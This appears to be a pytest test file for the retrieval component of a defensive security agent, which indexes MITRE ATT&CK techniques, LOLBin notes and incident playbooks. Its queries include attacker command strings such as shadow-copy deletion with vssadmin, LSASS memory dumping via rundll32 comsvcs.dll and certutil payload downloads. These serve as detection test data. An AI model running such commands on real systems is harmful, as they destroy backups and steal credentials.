from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from centralium.agent import nulls
from centralium.agent.interfaces import RAGRetriever
from centralium.agent.rag import LocalRAGRetriever, build_retriever
from centralium.agent.rag.ingestion import load_documents

DOCS = Path(__file__).resolve().parents[2] / "rag"


@pytest.fixture(scope="module")
def retr(tmp_path_factory):
    r, rep = build_retriever(DOCS, tmp_path_factory.mktemp("rag") / "i.db")
    assert rep.errors == []
    yield r
    r.close()


def test_corpus_has_required_coverage():
    docs, errors, files = load_documents(DOCS / "documents")
    assert errors == [] and files >= 8
    sources = {d.source for d in docs}
    assert {
        "mitre",
        "rule",
        "yara",
        "lolbin",
        "malware",
        "playbook",
        "ransomware",
        "persistence",
        "incident",
    } <= sources
    mitre = [d for d in docs if d.source == "mitre"]
    assert len(mitre) >= 30
    for d in mitre:
        assert d.metadata["tactic"] and "Detection ideas" in d.text and d.doc_id.startswith("mitre:T")
    assert len({d.doc_id for d in docs}) == len(docs)


def test_implements_protocol(retr):
    assert isinstance(retr, RAGRetriever) and isinstance(nulls.NullRAG(), RAGRetriever)


@pytest.mark.parametrize(
    ("query", "expected"),
    [
        (
            "vssadmin delete shadows /all /quiet",
            {"mitre:T1490", "lolbins_windows#vssadmin-wbadmin-and-bcdedit"},
        ),
        ("rundll32 comsvcs.dll MiniDump lsass memory", {"mitre:T1003.001"}),
        ("certutil -urlcache -f http://x/a.exe", {"lolbins_windows#certutil"}),
        ("modified authorized_keys ssh public key appended", {"mitre:T1098.004"}),
        ("mshta http remote hta script", {"mitre:T1218.005"}),
        ("LD_PRELOAD ld.so.preload shared object", {"mitre:T1574.006"}),
        ("mass file rename encrypted ransom note", {"mitre:T1486", "ransomware#ransom-notes"}),
        ("crontab entry every minute curl downloads", {"mitre:T1053.003", "lolbins_linux#curl-and-wget"}),
    ],
)
def test_relevance_known_query_to_expected_doc(retr, query, expected):
    got = retr.retrieve(query, 5)
    assert {d.doc_id for d in got} & expected, [d.doc_id for d in got]


def test_attribution_and_k_bounds(retr):
    docs = retr.retrieve("powershell encoded command download", 99)
    assert 3 <= len(docs) <= 5
    assert len(retr.retrieve("powershell encoded command download", 1)) >= 3
    for d in docs:
        assert d.source and d.doc_id and d.title and d.text
        assert d.metadata["attribution"] == f"{d.source}/{d.doc_id}"
    assert [d.score for d in docs] == sorted((d.score for d in docs), reverse=True)


def test_explicit_technique_id_in_query_is_boosted(retr):
    docs = retr.retrieve("alert T1055.012 observed on host", 3)
    assert docs[0].doc_id == "mitre:T1055.012"


def test_result_cache_hit_and_isolation(retr):
    q = "scheduled task created by script host schtasks"
    h0 = retr.cache_hits
    a = retr.retrieve(q, 4)
    b = retr.retrieve(q, 4)
    assert retr.cache_hits == h0 + 1
    assert [d.doc_id for d in a] == [d.doc_id for d in b]
    b[0].text = "mutated"
    assert retr.retrieve(q, 4)[0].text != "mutated"  # cache returns copies
    info = retr.info()
    assert info["lexical_embeddings"] is True and info["documents"] > 100


def test_empty_query_and_empty_index(tmp_path):
    r, _ = build_retriever(tmp_path / "none", tmp_path / "e.db")
    assert r.retrieve("anything", 4) == []
    r.close()
    r2, _ = build_retriever(DOCS, tmp_path / "e2.db")
    assert r2.retrieve("   ", 4) == []
    r2.close()


def test_incremental_ingestion_and_removal(tmp_path):
    rag = tmp_path / "rag"
    (rag / "documents").mkdir(parents=True)
    f = rag / "documents" / "a.md"
    f.write_text(
        "---\nsource: playbook\ntitle: A\n---\n## Alpha\nquarantine the dropper binary\n\n"
        "## Beta\nisolate the host network\n"
    )
    r, rep = build_retriever(rag)
    assert rep.added == 2 and rep.chunks == 2
    r.close()
    r, rep = build_retriever(rag)
    assert rep.unchanged == 2 and rep.added == 0
    r.close()
    f.write_text("---\nsource: playbook\ntitle: A\n---\n## Alpha\nquarantine the dropper binary now\n")
    r, rep = build_retriever(rag)
    assert rep.removed == 1 and rep.updated == 1
    assert [d.doc_id for d in r.retrieve("dropper", 3)] == ["a#alpha"]
    r.close()


def test_bad_files_are_reported_not_fatal(tmp_path):
    rag = tmp_path / "rag"
    (rag / "documents").mkdir(parents=True)
    (rag / "documents" / "bad.json").write_text("{not json")
    shutil.copy(DOCS / "documents" / "persistence.md", rag / "documents" / "persistence.md")
    (rag / "documents" / "ok.json").write_text(
        json.dumps(
            {
                "source": "ti",
                "documents": [{"doc_id": "ti:1", "title": "t", "text": "beacon every 60 seconds"}],
            }
        )
    )
    r, rep = build_retriever(rag)
    assert rep.errors and "bad.json" in rep.errors[0]
    assert any(d.doc_id == "ti:1" for d in r.retrieve("beacon every 60 seconds", 3))
    r.close()


def test_retrieval_failure_returns_empty(retr, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("store down")

    monkeypatch.setattr(retr.store, "search", boom)
    assert retr.retrieve("unique query that is not cached zzz", 3) == []


def test_works_with_numpy_fallback(tmp_path):
    r, _ = build_retriever(DOCS, tmp_path / "n.db", prefer_store="numpy")
    assert isinstance(r, LocalRAGRetriever) and r.info()["store_backend"] == "numpy-sqlite"
    assert "mitre:T1490" in {d.doc_id for d in r.retrieve("vssadmin delete shadows", 5)}
    r.close()
